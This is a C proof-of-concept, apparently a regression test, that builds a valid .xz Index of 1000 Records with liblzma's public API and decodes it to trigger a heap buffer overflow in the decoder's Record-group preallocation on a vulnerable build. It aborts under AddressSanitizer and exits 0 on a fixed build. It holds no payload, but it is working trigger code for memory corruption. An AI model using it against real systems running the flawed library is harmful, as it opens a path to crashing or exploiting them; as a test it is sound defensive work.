// Proof-of-concept for a heap buffer overflow in liblzma's .xz Index decoder.
//
// The program builds a perfectly valid .xz Index with many Records using the
// public encoder API, then decodes it with lzma_index_buffer_decode(). On the
// vulnerable tree the decoder preallocates a Record group that is smaller than
// the Number of Records it then writes, which overflows the heap buffer.
//
// Built with AddressSanitizer this aborts (SIGABRT) only on the vulnerable
// tree; on a correct build it decodes successfully and exits 0.

#include <lzma.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int
main(void)
{
	// Number of Records. Must exceed the group preallocation chunk so that
	// the decoder writes past the allocated group on the vulnerable tree.
	const size_t count = 1000;

	// Build a valid Index via the public API.
	lzma_index *idx = lzma_index_init(NULL);
	if (idx == NULL) {
		fprintf(stderr, "index_init failed\n");
		return 1;
	}

	for (size_t j = 0; j < count; ++j) {
		// Small, in-contract Block sizes (Unpadded Size >= 5).
		const lzma_vli unpadded = 8;
		const lzma_vli uncomp = 4;
		lzma_ret r = lzma_index_append(idx, NULL, unpadded, uncomp);
		if (r != LZMA_OK) {
			fprintf(stderr, "index_append %zu: %d\n", j, (int)r);
			return 1;
		}
	}

	// Encode the Index into a buffer.
	const size_t bufsize = (size_t)lzma_index_size(idx);
	uint8_t *buf = malloc(bufsize);
	if (buf == NULL)
		return 1;

	size_t out_pos = 0;
	lzma_ret er = lzma_index_buffer_encode(idx, buf, &out_pos, bufsize);
	if (er != LZMA_OK) {
		fprintf(stderr, "buffer_encode: %d\n", (int)er);
		return 1;
	}
	lzma_index_end(idx, NULL);

	// Decode the Index. This exercises the decoder's preallocation path.
	lzma_index *out_idx = NULL;
	uint64_t memlimit = UINT64_MAX;
	size_t in_pos = 0;
	lzma_ret dr = lzma_index_buffer_decode(&out_idx, &memlimit, NULL,
			buf, &in_pos, out_pos);

	printf("decode returned %d\n", (int)dr);
	if (out_idx != NULL)
		lzma_index_end(out_idx, NULL);
	free(buf);
	return 0;
}
